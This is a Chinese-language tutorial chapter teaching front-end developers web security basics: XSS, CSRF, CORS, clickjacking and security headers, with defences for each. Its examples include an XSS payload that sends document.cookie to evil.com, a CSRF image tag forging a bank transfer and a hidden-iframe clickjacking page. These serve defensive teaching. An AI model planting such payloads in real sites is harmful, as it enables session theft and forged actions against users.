---
title: 网络安全基础
---

# 网络安全基础

> Web 安全是前端开发不可忽视的领域。本章聚焦前端工程师需要掌握的常见攻击与防御：XSS、CSRF、CORS、点击劫持、内容安全策略（CSP）等。

---

## 一、Web 安全全景

### 1.1 攻击类型

```
Web 安全威胁
├── 注入类
│   ├── XSS（跨站脚本）
│   ├── SQL 注入（后端范畴）
│   └── 命令注入
│
├── 跨站类
│   ├── CSRF（跨站请求伪造）
│   └── 点击劫持（ClickJacking）
│
├── 传输类
│   ├── 中间人攻击（MITM）
│   └── 窃听
│
├── 业务类
│   ├── 越权访问
│   ├── 接口防刷
│   └── 暴力破解
│
└── 供应链
    ├── 依赖投毒
    └── CDN 劫持
```

### 1.2 防御原则

- **永不信任用户输入**：所有输入都要校验、转义
- **最小权限**：接口、Cookie 权限最小化
- **纵深防御**：多层防护，单点失守不致命
- **默认安全**：框架默认开启防护

---

## 二、XSS 跨站脚本攻击

### 2.1 什么是 XSS

攻击者向页面注入恶意脚本，在其他用户浏览器中执行。

```
用户 A 提交评论：<script>fetch('https://evil.com?cookie='+document.cookie)</script>
                    ↓ 服务器未过滤，存入数据库
用户 B 浏览评论 ──► 脚本执行 ──► Cookie 泄露给攻击者
```

### 2.2 XSS 类型

| 类型         | 英文              | 存储位置 | 危害    |
| ------------ | ----------------- | -------- | ------- |
| **存储型**   | Stored XSS        | 数据库   | 高      |
| **反射型**   | Reflected XSS     | URL      | 中      |
| **DOM 型**   | DOM-based XSS     | 前端代码 | 中      |

### 2.3 常见注入点

```js
// 1. innerHTML（最常见）
el.innerHTML = userInput; // ❌ 危险

// 2. document.write
document.write(userInput); // ❌

// 3. eval
eval(userInput); // ❌

// 4. href 属性
a.href = userInput; // 可能是 javascript:alert(1)

// 5. 模板字符串（无转义）
const tpl = `<div>${userInput}</div>`; // ❌
```

### 2.4 防御：输入输出处理

**输出转义**（最核心）：

```js
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

el.innerHTML = escapeHtml(userInput); // ✅
```

**使用安全 API**：

```js
// ❌ 危险
el.innerHTML = userInput;

// ✅ 安全（自动转义）
el.textContent = userInput;
```

**框架自动转义**：

```jsx
// React 默认转义
<div>{userInput}</div>  // ✅

// 显式不转义（dangerouslySetInnerHTML）需先 sanitize
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

### 2.5 防御：CSP

```http
# 只允许加载同源脚本
Content-Security-Policy: default-src 'self'; script-src 'self'

# 禁止内联脚本、eval
Content-Security-Policy: script-src 'self' 'nonce-abc123'

# 上报违规
Content-Security-Policy-Report-Only: ...; report-uri /csp-report
```

### 2.6 防御：HttpOnly Cookie

```http
Set-Cookie: sid=xxx; HttpOnly; Secure; SameSite=Strict
```

即使发生 XSS，JS 也无法读取 Cookie。

---

## 三、CSRF 跨站请求伪造

### 3.1 原理

利用用户已登录的身份，诱导其在不知情下发起请求。

```html
<!-- 攻击者诱导受害者访问的页面 -->
<img src="https://bank.com/transfer?to=hacker&amount=10000" />
<!-- 浏览器自动携带 bank.com 的 Cookie -->
```

### 3.2 CSRF vs XSS

| 对比项 | XSS              | CSRF              |
| ------ | ---------------- | ----------------- |
| **信任** | 信任用户输入    | 信任用户已登录     |
| **载体** | 脚本注入       | 伪造请求           |
| **防御** | 转义、CSP       | Token、SameSite    |

### 3.3 防御

**1. SameSite Cookie**（最有效）：

```http
Set-Cookie: sid=xxx; SameSite=Strict  # 跨站完全不带
Set-Cookie: sid=xxx; SameSite=Lax     # 跨站 GET 仍可带（默认）
```

**2. CSRF Token**：

```html
<!-- 服务端下发随机 token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="随机 token" />
  <input name="amount" />
</form>
```

服务端校验 token 是否匹配。

**3. 双重 Cookie**：

```js
// Cookie 中有 csrftoken
// 请求头/参数再带一次
fetch(url, {
  headers: { 'X-CSRF-Token': getCookie('csrftoken') }
});
```

**4. 校验 Origin / Referer**：

```js
const origin = req.headers.origin || req.headers.referer;
if (!isSameOrigin(origin)) {
  return res.status(403).send('Forbidden');
}
```

---

## 四、CORS 跨域资源共享

### 4.1 同源策略

**同源** = 协议 + 域名 + 端口 全相同。

```
https://example.com:443/a
└──协议┘└──域名──┘└端口┘

不同源示例：
- http://example.com     （协议不同）
- https://api.example.com （子域不同）
- https://example.com:8080（端口不同）
```

### 4.2 简单请求 vs 预检请求

**简单请求**（不触发预检）：
- 方法：GET / HEAD / POST
- Content-Type：`text/plain` / `application/x-www-form-urlencoded` / `multipart/form-data`
- 无自定义头部

**预检请求**（OPTIONS）：
- 方法：PUT / DELETE 等
- Content-Type：`application/json`
- 自定义头部：`X-Token` 等

### 4.3 预检流程

```
Client                                       Server
  │ ── OPTIONS /api ──────────────────────► │
  │    Origin: https://example.com           │
  │    Access-Control-Request-Method: PUT    │
  │    Access-Control-Request-Headers: X-Token│
  │                                          │
  │ ◄──── 预检响应 ──────────────────────── │
  │    Access-Control-Allow-Origin: ...      │
  │    Access-Control-Allow-Methods: ...     │
  │    Access-Control-Allow-Headers: ...     │
  │    Access-Control-Max-Age: 86400         │
  │                                          │
  │ ── PUT /api (真实请求) ────────────────►│
  │ ◄──── 200 OK ──────────────────────────│
```

### 4.4 服务端配置

```js
// Express
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://example.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.header('Access-Control-Allow-Credentials', 'true'); // 允许带 Cookie
  res.header('Access-Control-Max-Age', '86400');

  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }
  next();
});
```

### 4.5 带 Cookie 跨域

```js
// 客户端
fetch(url, { credentials: 'include' });

// 服务端（不能再用 *，必须指定具体 Origin）
res.header('Access-Control-Allow-Origin', 'https://example.com');
res.header('Access-Control-Allow-Credentials', 'true');
```

---

## 五、点击劫持 ClickJacking

### 5.1 原理

攻击者用透明 iframe 覆盖自己的页面，诱导用户点击实际是操作被嵌入页面。

```html
<!-- 攻击者页面 -->
<iframe src="https://bank.com/transfer" style="opacity:0" />
<button>领取红包</button> <!-- 实际点击的是 iframe 中的转账按钮 -->
```

### 5.2 防御：X-Frame-Options

```http
X-Frame-Options: DENY              # 禁止被嵌入
X-Frame-Options: SAMEORIGIN        # 同源可嵌入
```

### 5.3 防御：CSP frame-ancestors

```http
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
```

### 5.4 防御：JS 顶层检测

```js
if (top !== self) {
  top.location = self.location; // 跳出 iframe
}
```

---

## 六、其他攻击

### 6.1 中间人攻击（MITM）

```
Client ────► 攻击者 ────► Server
        ◄───        ◄───
        攻击者可窃听、篡改
```

防御：HTTPS + HSTS + 证书钉扎。

### 6.2 依赖投毒

- `npm` 包被劫持植入恶意代码
- `typosquatting`：仿冒知名包名

防御：
- 锁定版本（`package-lock.json`）
- 使用 `npm audit`
- 私有 registry 镜像

### 6.3 开放重定向

```js
// 危险
app.get('/redirect', (req, res) => {
  res.redirect(req.query.url); // 可被用于钓鱼
});
```

防御：白名单校验。

---

## 七、安全头部清单

部署 HTTPS 后建议设置的安全响应头：

| 头部                       | 作用                         |
| -------------------------- | ---------------------------- |
| `Strict-Transport-Security`| 强制 HTTPS                   |
| `Content-Security-Policy`  | 限制资源加载，防 XSS          |
| `X-Frame-Options`          | 防点击劫持                   |
| `X-Content-Type-Options`   | 禁止 MIME 嗅探               |
| `Referrer-Policy`          | 控制 Referer 泄露            |
| `Permissions-Policy`      | 控制浏览器特性权限            |

---

## 八、学习建议

1. **XSS**：理解三种类型，掌握转义、CSP、HttpOnly 三道防线
2. **CSRF**：理解与 XSS 的区别，会用 SameSite + Token 防御
3. **CORS**：能区分简单请求与预检请求，能配置带 Cookie 的跨域
4. **安全头部**：知道 6 个常用安全响应头

---

## 参考

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MDN - CORS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS)
- [Content Security Policy (CSP)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)
